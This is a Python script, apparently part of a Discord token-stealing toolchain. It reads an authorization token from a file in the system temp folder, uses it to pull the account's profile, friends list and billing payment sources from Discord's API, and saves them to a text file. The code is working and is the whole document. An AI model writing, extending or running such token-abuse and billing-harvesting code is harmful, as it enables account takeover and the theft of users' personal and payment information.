import os
import requests
import tempfile

url1 = 'https://discord.com/api/v9/users/@me'
url2 = 'https://discord.com/api/v9/users/@me/relationships'
url3 = 'https://discord.com/api/users/@me/billing/payment-sources'

temp_folder = tempfile.gettempdir()
token_file = os.path.join(temp_folder, 'discord_token.txt')

# Read the token from the file
with open(token_file, 'r') as file:
    # Skip the first two lines
    file.readline()
    file.readline()
    # Read the token from the third line
    token = file.readline().strip()

headers = {
    'Authorization': token
}

# Make the request to Discord API - endpoint 1
response1 = requests.get(url1, headers=headers)
response_data1 = response1.json()

# Make the request to Discord API - endpoint 2
response2 = requests.get(url2, headers=headers)
response_data2 = response2.json()

# Make the request to Discord API - endpoint 3
response3 = requests.get(url3, headers=headers)
response_data3 = response3.json()

# Remove unwanted keys from user data
keys_to_remove = ['flags', 'locale', 'avatar', 'banner', 'banner_color', 'accent_color', 'Type', 'Premium Type']
for key in keys_to_remove:
    response_data1.pop(key, None)

# Replace underscores with spaces in key names and capitalize the first letter of each word (except "id")
response_data1 = {key.replace('_', ' ').title() if key != 'id' else 'ID': value for key, value in response_data1.items()}
response_data2 = [{key.replace('_', ' ').title() if key != 'id' else 'ID': value for key, value in item.items()} for item in response_data2]

# Store the output in a text file
output_file = 'output.txt'
with open(output_file, 'w') as file:
    # Write user data heading
    file.write("User Data\n")
    file.write("-----------------------\n")
    for key, value in response_data1.items():
        file.write(f"{key}: {value}\n")
    file.write("\n")
    
    # Write friends heading
    file.write("Friends\n")
    file.write("-----------------------\n")
    for item in response_data2:
        for key, value in item.items():
            file.write(f"{key}: {value}\n")
        file.write("\n")

    # Write billing info heading
    file.write("Billing Info\n")
    file.write("-----------------------\n")
    for item in response_data3:
        for key, value in item.items():
            file.write(f"{key}: {value}\n")
        file.write("\n")

print(f"Output saved to {output_file}")
